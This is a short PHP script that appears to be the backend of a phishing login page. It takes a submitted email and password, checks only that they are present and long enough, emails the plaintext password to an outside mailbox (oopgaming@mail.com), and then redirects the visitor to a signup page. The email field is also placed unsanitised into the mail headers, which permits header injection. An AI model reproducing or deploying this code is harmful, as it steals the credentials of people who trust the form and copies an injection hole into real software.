<?php
// print_r($_POST);
$email = $_POST['email'];
$password = $_POST['password'];

$error = '';
if(trim($email) == '')
$error = 'Введите ваш email';
else if(trim($password) == '')
$error = 'Введите пароль';
else if(strlen($password) < 8)
$error = 'Пароль должно быть более чем 8 символов';

if($error != '') {
    echo $error;
    exit;
}

$subject = "=?utf-8?B?".base64_encode("Вход в зону!")."?=";
$headers = "From: $email\r\nReply-to: $email\r\nContent-type: text/html;charset=utf-8\r\n";


mail('oopgaming@mail.com', $subject, $password, $headers);

header('Location: /signup.html');
?>